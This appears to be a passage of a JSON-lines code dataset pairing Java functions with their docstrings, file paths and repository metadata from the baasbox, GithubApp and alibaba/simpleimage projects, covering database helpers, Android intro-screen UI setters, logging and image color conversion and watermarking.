null, true);\n\t\t\t\t\tbody = play.test.Helpers.contentAsString(result2);\n\t\t\t\t\tnode = Json.parse(body);\n\t\t\t\t\tfor(final JsonNode n : node.get(\"data\")){\n\t\t\t\t\t\tif(n.asText().equals(fileName)){\n\t\t\t\t\t\t\tgen = true;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\ttry {\n\t\t\t\t\t\tThread.sleep(5000);\n\t\t\t\t\t} catch (InterruptedException e) {\n\t\t\t\t\t\tfail(\"Unable to sleep the thread\");\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t}\n\t\t\t\tdelete(fileName);\n\t\t\t\t\n\t\t\t}\n\t\t}\n\t);\t\t\n}", "path": "test\\AdminExportTest.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "//todo update script\n//todo read/update store\n//todo clear log\n", "func_signal": "public ODocument save(ODocument doc)", "code": "{\n    doc.save();\n    return doc;\n}", "path": "app\\com\\baasbox\\dao\\ScriptsDao.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/**\n * Escapes the given string using URL encoding for all bytes not included\n * in the given set of safe characters.\n *\n * @param s the string to escape\n * @param safeChars set of safe characters (bytes)\n * @return escaped string\n */\n", "func_signal": "private static String escape(String s, BitSet safeChars)", "code": "{\n    byte[] bytes = s.getBytes();\n    StringBuilder out = new StringBuilder(bytes.length);\n    for (int i = 0; i < bytes.length; i++) {\n        int c = bytes[i] & 0xff;\n        if (safeChars.get(c) && c != ESCAPE_CHAR) {\n            out.append((char) c);\n        } else {\n            out.append(ESCAPE_CHAR);\n        }\n    }\n    return out.toString();\n}", "path": "app\\com\\baasbox\\util\\FileSystemPathUtil.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/**\n * Check the db level and evolve it\n * @param db\n */\n", "func_signal": "public static void evolveDB(ODatabaseRecordTx db)", "code": "{\n\t//check for evolutions\n\t BaasBoxLogger.info(\"...looking for evolutions...\");\n\t String fromVersion=\"\";\n\t if (db.getMetadata().getIndexManager().getIndex(\"_bb_internal\")!=null){\n\t\t BaasBoxLogger.warn(\"...DB is < 0.7 ....\");\n\t\t ORID o = (ORID) db.getMetadata().getIndexManager().getIndex(\"_bb_internal\").get(Internal.DB_VERSION.getKey());\n\t\t ODocument od = db.load(o);\n\t\t fromVersion=od.field(\"value\");\n\t }else fromVersion=Internal.DB_VERSION.getValueAsString();\n\t BaasBoxLogger.info(\"...db version is: \" + fromVersion);\n\t if (!fromVersion.equalsIgnoreCase(BBConfiguration.getDBVersion())){\n\t\t BaasBoxLogger.info(\"...imported DB needs evolutions!...\");\n\t\t Evolutions.performEvolutions(db, fromVersion);\n\t\t Internal.DB_VERSION._setValue(BBConfiguration.getDBVersion());\n\t\t BaasBoxLogger.info(\"DB version is now \" + BBConfiguration.getDBVersion());\n\t }//end of evolutions\n}", "path": "app\\com\\baasbox\\db\\DbHelper.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/***\n * Executes a generic SQL command statements\n * @param command the command to execute prepared by {@link #genericSQLStatementCommandBuilder(String)}\n * @param params The positional parameters to pass to the statement\n * @return\n */\n", "func_signal": "public static Object genericSQLCommandExecute(OCommandRequest command, Object[] params)", "code": "{\n\tObject queryResult = command.execute((Object[])params);\n\treturn queryResult;\n}", "path": "app\\com\\baasbox\\db\\DbHelper.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/**\n * Override separator color\n *\n * @param color your color resource\n */\n", "func_signal": "public void setSeparatorColor(@ColorInt final int color)", "code": "{\n    TextView separator = (TextView) findViewById(R.id.bottom_separator);\n    separator.setBackgroundColor(color);\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntro.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * Override is required to trigger {@link OnPageChangeListener#onPageSelected} for the first page.\n * This is needed to correctly handle progress button display after rotation on a locked first page.\n */\n", "func_signal": "@Override\npublic void setCurrentItem(int item)", "code": "{\n    // when you pass set current item to 0,\n    // the pageChangeListener won't be called so we call it on our own\n    boolean invokeMeLater = false;\n\n    if (super.getCurrentItem() == 0 && item == 0)\n        invokeMeLater = true;\n\n    super.setCurrentItem(item);\n\n    if (invokeMeLater && pageChangeListener != null)\n        pageChangeListener.onPageSelected(0);\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntroViewPager.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * Override skip button color\n *\n * @param colorSkipButton your color resource\n */\n", "func_signal": "public void setColorSkipButton(@ColorInt final int colorSkipButton)", "code": "{\n    TextView skip = (TextView) findViewById(R.id.skip);\n    skip.setTextColor(colorSkipButton);\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntro.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * Override skip text\n *\n * @param text your text\n */\n", "func_signal": "public void setSkipText(@Nullable final CharSequence text)", "code": "{\n    TextView skipText = (TextView) findViewById(R.id.skip);\n    skipText.setText(text);\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntro.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * Override Next button\n *\n * @param imageNextButton your drawable resource\n */\n", "func_signal": "public void setImageNextButton(@DrawableRes final Drawable imageNextButton)", "code": "{\n    final ImageView nextButton = (ImageView) findViewById(R.id.next);\n    nextButton.setImageDrawable(imageNextButton);\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntro.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * Override viewpager bar color\n *\n * @param color your color resource\n */\n", "func_signal": "public void setBarColor(@ColorInt final int color)", "code": "{\n    LinearLayout bottomBar = (LinearLayout) findViewById(R.id.bottom);\n    bottomBar.setBackgroundColor(color);\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntro.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * Enable or disable swiping to the next page\n *\n * @param nextPagingEnabled Whether swiping to the next page should be enabled or not\n */\n", "func_signal": "public void setNextPagingEnabled(boolean nextPagingEnabled)", "code": "{\n    this.nextPagingEnabled = nextPagingEnabled;\n    if (!nextPagingEnabled) {\n        lockPage = getCurrentItem();\n    }\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntroViewPager.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * Override skip text typeface\n *\n * @param typeURL URL of font file located in Assets folder\n */\n", "func_signal": "public void setSkipTextTypeface(@Nullable final String typeURL)", "code": "{\n    TextView skipText = (TextView) findViewById(R.id.skip);\n    if (CustomFontCache.get(typeURL, this) != null) {\n        skipText.setTypeface(CustomFontCache.get(typeURL, this));\n    }\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntro.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * Override done button text color\n *\n * @param colorDoneText your color resource\n */\n", "func_signal": "public void setColorDoneText(@ColorInt final int colorDoneText)", "code": "{\n    TextView doneText = (TextView) findViewById(R.id.done);\n    doneText.setTextColor(colorDoneText);\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntro.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * Override Next button\n *\n * @param imageSkipButton your drawable resource\n */\n", "func_signal": "public void setImageSkipButton(@DrawableRes final Drawable imageSkipButton)", "code": "{\n    final ImageButton nextButton = (ImageButton) findViewById(R.id.skip);\n    nextButton.setImageDrawable(imageSkipButton);\n\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntro2.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * \u5904\u7406\u5fae\u4fe1\u53d1\u51fa\u7684\u5411\u7b2c\u4e09\u65b9\u5e94\u7528\u8bf7\u6c42app message\n * <p>\n * \u5728\u5fae\u4fe1\u5ba2\u6237\u7aef\u4e2d\u7684\u804a\u5929\u9875\u9762\u6709\u201c\u6dfb\u52a0\u5de5\u5177\u201d\uff0c\u53ef\u4ee5\u5c06\u672c\u5e94\u7528\u7684\u56fe\u6807\u6dfb\u52a0\u5230\u5176\u4e2d\n * \u6b64\u540e\u70b9\u51fb\u56fe\u6807\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u4f1a\u88ab\u6267\u884c\u3002Demo\u4ec5\u4ec5\u53ea\u662f\u6253\u5f00\u81ea\u5df1\u800c\u5df2\uff0c\u4f46\u4f60\u53ef\n * \u505a\u70b9\u5176\u4ed6\u7684\u4e8b\u60c5\uff0c\u5305\u62ec\u6839\u672c\u4e0d\u6253\u5f00\u4efb\u4f55\u9875\u9762\n */\n", "func_signal": "public void onGetMessageFromWXReq(WXMediaMessage msg)", "code": "{\n\tif (msg != null) {\n\t\tIntent iLaunchMyself = getPackageManager().getLaunchIntentForPackage(getPackageName());\n\t\tstartActivity(iLaunchMyself);\n\t}\n}", "path": "sharesdk\\src\\main\\java\\com\\anly\\githubapp\\wxapi\\WXEntryActivity.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "// Detects the direction of swipe. Right or left.\n// Returns true if swipe is in right direction\n", "func_signal": "private boolean detectSwipeToRight(MotionEvent event)", "code": "{\n    final int SWIPE_THRESHOLD = 0; // detect swipe\n    boolean result = false;\n\n    try {\n        float diffX = event.getX() - currentTouchDownX;\n        if (Math.abs(diffX) > SWIPE_THRESHOLD) {\n            if (diffX < 0) {\n                // swipe from right to left detected ie.SwipeLeft\n                result = true;\n            }\n        }\n    } catch (Exception exception) {\n        exception.printStackTrace();\n    }\n    return result;\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntroViewPager.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * Override done text typeface\n *\n * @param typeURL your text\n */\n", "func_signal": "public void setDoneTextTypeface(@Nullable final String typeURL)", "code": "{\n    TextView doneText = (TextView) findViewById(R.id.done);\n    if (CustomFontCache.get(typeURL, this) != null) {\n        doneText.setTypeface(CustomFontCache.get(typeURL, this));\n    }\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntro.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * Override done text\n *\n * @param text your text\n */\n", "func_signal": "public void setDoneText(@Nullable final CharSequence text)", "code": "{\n    TextView doneText = (TextView) findViewById(R.id.done);\n    doneText.setText(text);\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntro.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * Override next button arrow color\n *\n * @param color your color\n */\n", "func_signal": "public void setNextArrowColor(@ColorInt final int color)", "code": "{\n    ImageButton nextButton = (ImageButton) findViewById(R.id.next);\n    nextButton.setColorFilter(color);\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntro.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * log.w\n * @param msg\n */\n", "func_signal": "public static void w(String msg)", "code": "{\n    if (BuildConfig.DEBUG) {\n        Logger.w(msg);\n    }\n}", "path": "app\\src\\main\\java\\com\\anly\\githubapp\\common\\wrapper\\AppLog.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * Override the Scroller instance with our own class so we can change the\n * duration\n */\n", "func_signal": "private void initViewPagerScroller()", "code": "{\n    try {\n        Field scroller = ViewPager.class.getDeclaredField(\"mScroller\");\n        scroller.setAccessible(true);\n        Field interpolator = ViewPager.class.getDeclaredField(\"sInterpolator\");\n        interpolator.setAccessible(true);\n\n        mScroller = new ScrollerCustomDuration(getContext(),\n                (Interpolator) interpolator.get(null));\n        scroller.set(this, mScroller);\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n}", "path": "appintro\\src\\main\\java\\com\\github\\paolorotolo\\appintro\\AppIntroViewPager.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * log.d\n * @param msg\n */\n", "func_signal": "public static void d(String msg)", "code": "{\n    if (BuildConfig.DEBUG) {\n        Logger.d(msg);\n    }\n}", "path": "app\\src\\main\\java\\com\\anly\\githubapp\\common\\wrapper\\AppLog.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * log.i\n * @param msg\n */\n", "func_signal": "public static void i(String msg)", "code": "{\n    if (BuildConfig.DEBUG) {\n        Logger.i(msg);\n    }\n}", "path": "app\\src\\main\\java\\com\\anly\\githubapp\\common\\wrapper\\AppLog.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * \u5904\u7406\u5fae\u4fe1\u5411\u7b2c\u4e09\u65b9\u5e94\u7528\u53d1\u8d77\u7684\u6d88\u606f\n * <p>\n * \u6b64\u5904\u7528\u6765\u63a5\u6536\u4ece\u5fae\u4fe1\u53d1\u9001\u8fc7\u6765\u7684\u6d88\u606f\uff0c\u6bd4\u65b9\u8bf4\u672cdemo\u5728wechatpage\u91cc\u9762\u5206\u4eab\n * \u5e94\u7528\u65f6\u53ef\u4ee5\u4e0d\u5206\u4eab\u5e94\u7528\u6587\u4ef6\uff0c\u800c\u5206\u4eab\u4e00\u6bb5\u5e94\u7528\u7684\u81ea\u5b9a\u4e49\u4fe1\u606f\u3002\u63a5\u53d7\u65b9\u7684\u5fae\u4fe1\n * \u5ba2\u6237\u7aef\u4f1a\u901a\u8fc7\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5c06\u8fd9\u4e2a\u4fe1\u606f\u53d1\u9001\u56de\u63a5\u6536\u65b9\u624b\u673a\u4e0a\u7684\u672cdemo\u4e2d\uff0c\u5f53\u4f5c\n * \u56de\u8c03\u3002\n * <p>\n * \u672cDemo\u53ea\u662f\u5c06\u4fe1\u606f\u5c55\u793a\u51fa\u6765\uff0c\u4f46\u4f60\u53ef\u505a\u70b9\u5176\u4ed6\u7684\u4e8b\u60c5\uff0c\u800c\u4e0d\u4ec5\u4ec5\u53ea\u662fToast\n */\n", "func_signal": "public void onShowMessageFromWXReq(WXMediaMessage msg)", "code": "{\n\tif (msg != null && msg.mediaObject != null\n\t\t\t&& (msg.mediaObject instanceof WXAppExtendObject)) {\n\t\tWXAppExtendObject obj = (WXAppExtendObject) msg.mediaObject;\n\t\tToast.makeText(this, obj.extInfo, Toast.LENGTH_SHORT).show();\n\t}\n}", "path": "sharesdk\\src\\main\\java\\com\\anly\\githubapp\\wxapi\\WXEntryActivity.java", "repo_name": "mingjunli/GithubApp", "stars": 676, "license": "apache-2.0", "language": "java", "size": 4381}
{"docstring": "/**\n * \n */\n", "func_signal": "public WatermarkParameter(ImageWrapper watermark)", "code": "{\n    super();\n    setWatermark(watermark);\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\render\\WatermarkParameter.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/**\n * @param src2\n * @param param1\n * @param param2\n * @param param3\n */\n", "func_signal": "public WatermarkParameter(ImageWrapper watermark, float alpha, int x, int y)", "code": "{\n    super();\n    setWatermark(watermark);\n    setAlpha(alpha);\n    setX(x);\n    setY(y);\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\render\\WatermarkParameter.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/*\n * (non-Javadoc)\n * @see com.alibaba.simpleimage.ImageRender#dispose()\n */\n", "func_signal": "@Override\npublic void dispose() throws SimpleImageException", "code": "{\n    super.dispose();\n\n    if (needClean) {\n        if (stream != null) {\n            try {\n                stream.flush();\n                stream.close();\n            } catch (IOException e) {\n                throw new SimpleImageException(e);\n            }\n        }\n    }\n\n    this.stream = null;\n    this.image = null;\n    this.param = null;\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\render\\WriteRender.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/**\n * @param text\n * @param fontColor\n * @param fontShadowColor\n * @param defaultFont\n * @param minFontSize\n */\n", "func_signal": "public FixDrawTextItem(String text, Position position, float textWidthPercent)", "code": "{\n    super(text, FONT_COLOR, FONT_SHADOW_COLOR, FONT, MIN_FONT_SIZE);\n    this.position = position;\n    this.textWidthPercent = textWidthPercent;\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\render\\FixDrawTextItem.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/*\n * (non-Javadoc)\n * @see\n * javax.media.jai.CRIFImpl#create(java.awt.image.renderable.ParameterBlock,\n * java.awt.RenderingHints)\n */\n", "func_signal": "@SuppressWarnings(\"deprecation\")\n@Override\npublic RenderedImage create(ParameterBlock paramBlock, RenderingHints renderHints)", "code": "{\n    ImageLayout layout = RIFUtil.getImageLayoutHint(renderHints);\n\n    RenderedImage source = paramBlock.getRenderedSource(0);\n    double scaleX = paramBlock.getDoubleParameter(0);\n    double scaleY = paramBlock.getDoubleParameter(1);\n\n    // Check and see if we are scaling by 1.0 in both x and y and no\n    // translations. If so return the source directly.  \n    if (scaleX == 1.0 && scaleY == 1.0) {\n        return source;\n    }\n\n    return new LanczosOpImage(source, layout, renderHints, scaleX, scaleY);\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\jai\\scale\\LanczosCRIF.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/**\n * \u8fd9\u4e2a\u8f6c\u7070\u5ea6\u56fe\u50cf\u4e3aRGB\uff0c\u5229\u7528\u516c\u5f0f r = gray, g = gray, b = gray \u6765\u505a\u7684\u8f6c\u6362\n * \n * @param src\n * @return\n */\n", "func_signal": "public static PlanarImage convertGray2RGB(PlanarImage src)", "code": "{\n    ColorSpace srcCS = src.getColorModel().getColorSpace();\n    if(srcCS.getType() == ColorSpace.TYPE_GRAY) {\n        int x = 3;\n        int y = src.getSampleModel().getNumBands() + 1;\n        double[][] matrix = new double[x][y];\n        for (int i = 0; i < x; i++) {\n            for (int j = 0; j < y; j++) {\n                if (j == 0) {\n                    matrix[i][j] = 1.0D;\n                } else {\n                    matrix[i][j] = 0.0D;\n                }\n            }\n        }\n\n        ParameterBlock pb = new ParameterBlock();\n        pb.addSource(src);\n        pb.add(matrix);\n        src = JAI.create(\"bandcombine\", pb, null);\n    }\n\n    return src;\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\util\\ImageColorConvertHelper.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/**\n * @param y the y to set\n */\n", "func_signal": "public void setY(int y)", "code": "{\n    if(y < 0) {\n        throw new IllegalArgumentException(\"y must be greater than 0\");\n    }\n    this.y = y;\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\render\\WatermarkParameter.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/**\n * @param alpha the alpha to set\n */\n", "func_signal": "public void setAlpha(float alpha)", "code": "{\n    if(alpha > 1.0f || alpha < 0.0f) {\n        throw new IllegalArgumentException(\"Alpha must be in [0.0, 1.0]\");\n    }\n    this.alpha = alpha;\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\render\\WatermarkParameter.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/*\n * (non-Javadoc)\n * @see com.alibaba.simpleimage.render.DrawTextItem#drawText(java.awt.Graphics2D, int, int)\n */\n", "func_signal": "@Override\npublic void drawText(Graphics2D graphics, int width, int height)", "code": "{\n    if(StringUtils.isBlank(text)) {\n        return ;\n    }\n    \n    int x = 0, y = 0;\n    int fontsize = 1;\n    if (position == Position.CENTER) {\n        // \u8ba1\u7b97\u6c34\u5370\u6587\u5b57\u603b\u957f\u5ea6\n        int textLength = (int) (width * textWidthPercent);\n        // \u8ba1\u7b97\u6c34\u5370\u5b57\u4f53\u5927\u5c0f\n        fontsize = textLength / text.length();\n        // \u592a\u5c0f\u4e86.....\u4e0d\u663e\u793a\n        if (fontsize < minFontSize) {\n            return;\n        }\n\n        float fsize = (float)fontsize;\n        Font font = defaultFont.deriveFont(fsize);\n        graphics.setFont(font);\n        FontRenderContext context = graphics.getFontRenderContext();\n        int sw = (int) font.getStringBounds(text, context).getWidth();\n\n        // \u8ba1\u7b97\u5b57\u4f53\u7684\u5750\u6807\n        x = (width - sw) / 2;\n        y = height / 2 + fontsize / 2;\n    } else if (position == Position.TOP_LEFT) {\n        fontsize = ((int)(width * textWidthPercent)) / text.length();\n        if (fontsize < minFontSize) {\n            return;\n        }\n\n        float fsize = (float)fontsize;\n        Font font = defaultFont.deriveFont(fsize);\n        graphics.setFont(font);\n\n        x = fontsize;\n        y = fontsize * 2;\n    } else if (position == Position.TOP_RIGHT) {\n        fontsize = ((int)(width * textWidthPercent)) / text.length();\n        if (fontsize < minFontSize) {\n            return;\n        }\n\n        float fsize = (float)fontsize;\n        Font font = defaultFont.deriveFont(fsize);\n        graphics.setFont(font);\n        FontRenderContext context = graphics.getFontRenderContext();\n        int sw = (int) font.getStringBounds(text, context).getWidth();\n\n        x = width - sw - fontsize;\n        y = fontsize * 2;\n    } else if (position == Position.BOTTOM_LEFT) {\n        fontsize = ((int)(width * textWidthPercent)) / text.length();\n        if (fontsize < minFontSize) {\n            return;\n        }\n\n        float fsize = (float)fontsize;\n        Font font = defaultFont.deriveFont(fsize);\n        graphics.setFont(font);\n\n        x = fontsize / 2;\n        y = height - fontsize;\n    } else if (position == Position.BOTTOM_RIGHT) {\n        fontsize = ((int)(width * textWidthPercent)) / text.length();\n        if (fontsize < minFontSize) {\n            return;\n        }\n        \n        float fsize = (float)fontsize;\n        Font font = defaultFont.deriveFont(fsize);\n        graphics.setFont(font);\n        FontRenderContext context = graphics.getFontRenderContext();\n        int sw = (int) font.getStringBounds(text, context).getWidth();\n\n        x = width - sw - fontsize;\n        y = height - fontsize;\n    } else {\n        throw new IllegalArgumentException(\"Unknown position : \" + position);\n    }\n\n    if(x <= 0 || y <= 0) {\n        return ;\n    }\n    \n    if (fontShadowColor != null) {\n        graphics.setColor(fontShadowColor);\n        graphics.drawString(text, x + getShadowTranslation(fontsize), y + getShadowTranslation(fontsize));\n    }\n\n    graphics.setColor(fontColor);\n    graphics.drawString(text, x, y);\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\render\\FixDrawTextItem.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/**\n * JAI\u5728\u8bfbcmyk\u683c\u5f0f\u7684\u65f6\u5019\u52062\u79cd\uff1a\n * \n * <pre>\n * CMYK\u7684\u56fe\u5f62\u8bfb\u53d6\uff0cJAI\u4f7f\u7528\u7684RGBA\u7684\u6a21\u5f0f\u7684\uff0c \u56e0\u6b64\uff0c\u4e3a\u4e86\u66ff\u6362\u4f7f\u7528\u81ea\u5df1\u7684Color Profile\uff0c \u76f4\u63a5\u4f7f\u7528format\u7684\u64cd\u4f5c\u3002 \n * <li>\u5982\u679ccmyk\u81ea\u5e26\u4e86 ICC_Profile\uff0c \u90a3\u4e48\u6570\u636e\u662f\u4e0d\u4f1a\u88ab\u4fee\u6539\u7684\u3002 \u8fd9\u4e2a\u60c5\u51b5\u4e0b\uff0c \u6211\u4eec\u5e94\u8be5\u4f7f\u7528\u5185\u7f6e\u7684Color Profile</li> \n * <li>\u5982\u679ccmyk\u56fe\u5f62\u4f7f\u7528\u9ed8\u8ba4\u7684ICC_Profile, \u90a3\u4e48\u4ed6\u4f7f\u7528\u5185\u7f6e\u7684InvertedCMYKColorSpace\uff0c \u8fd9\u662f\u65f6\u5019\u989c\u8272\u4f1a\u53d1\u751f\u53cd\u8f6c</li>\n * </pre>\n * \n * @param src \u4efb\u610f\u989c\u8272\u7a7a\u95f4\u56fe\u5f62\n * @return ColorSpace.CS_sRGB \u8868\u793a\u7684BufferedImage\n */\n", "func_signal": "public static PlanarImage convertCMYK2RGB(PlanarImage src)", "code": "{\n\n    ColorSpace srcColorSpace = src.getColorModel().getColorSpace();\n    // check if BufferedImage is cmyk format\n    if (srcColorSpace.getType() != ColorSpace.TYPE_CMYK) {\n        return src;\n    }\n\n    /**\n     * ICC_ColorSpace object mean jai read ColorSpace from image embed profile, we can not inverted cmyk color, and\n     * can not repace BufferedImage's ColorSpace\n     */\n    if (srcColorSpace instanceof ICC_ColorSpace) {\n        // -- Convert CMYK to RGB\n        ColorSpace rgbColorSpace = ColorSpace.getInstance(ColorSpace.CS_sRGB);\n        ColorModel rgbColorModel = RasterFactory.createComponentColorModel(DataBuffer.TYPE_BYTE, rgbColorSpace,\n                                                                           false, true, Transparency.OPAQUE);\n        ImageLayout rgbImageLayout = new ImageLayout();\n        rgbImageLayout.setSampleModel(rgbColorModel.createCompatibleSampleModel(src.getWidth(), src.getHeight()));\n        RenderingHints rgbHints = new RenderingHints(JAI.KEY_IMAGE_LAYOUT, rgbImageLayout);\n        rgbHints.put(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY);\n        ParameterBlockJAI pb = new ParameterBlockJAI(\"colorconvert\");\n        pb.addSource(src);\n        pb.setParameter(\"colormodel\", rgbColorModel);\n\n        return JAI.create(\"colorconvert\", pb, rgbHints);\n    } else {\n\n        // get user defined color from ColorProfile data\n        ColorSpace cmykColorSpace = CMMColorSpace.getInstance(src.getColorModel().getColorSpace().getType());\n\n        ColorModel cmykColorModel = RasterFactory.createComponentColorModel(src.getSampleModel().getDataType(),\n                                                                            cmykColorSpace, false, true,\n                                                                            Transparency.OPAQUE);\n        // replace ColorSpace by format convertor with CMYK ColorSpace\n        ImageLayout cmykImageLayout = new ImageLayout();\n        cmykImageLayout.setColorModel(cmykColorModel);\n        RenderingHints cmykHints = new RenderingHints(JAI.KEY_IMAGE_LAYOUT, cmykImageLayout);\n        cmykHints.put(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY);\n        ParameterBlockJAI pb = new ParameterBlockJAI(\"format\");\n        pb.addSource(src);\n        pb.setParameter(\"datatype\", src.getSampleModel().getDataType());\n        PlanarImage op = JAI.create(\"format\", pb, cmykHints);\n\n        // invert CMYK pixel value\n        pb = new ParameterBlockJAI(\"invert\");\n        pb.addSource(src);\n        op = JAI.create(\"invert\", pb, cmykHints);\n\n        // -- Convert CMYK to RGB\n        ColorSpace rgbColorSpace = ColorSpace.getInstance(ColorSpace.CS_sRGB);\n        ColorModel rgbColorModel = RasterFactory.createComponentColorModel(DataBuffer.TYPE_BYTE, rgbColorSpace,\n                                                                           false, true, Transparency.OPAQUE);\n        ImageLayout rgbImageLayout = new ImageLayout();\n        rgbImageLayout.setSampleModel(rgbColorModel.createCompatibleSampleModel(op.getWidth(), op.getHeight()));\n        RenderingHints rgbHints = new RenderingHints(JAI.KEY_IMAGE_LAYOUT, rgbImageLayout);\n        rgbHints.put(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY);\n        pb = new ParameterBlockJAI(\"colorconvert\");\n        pb.addSource(op);\n        pb.setParameter(\"colormodel\", rgbColorModel);\n\n        return JAI.create(\"colorconvert\", pb, rgbHints);\n    }// endif\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\util\\ImageColorConvertHelper.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
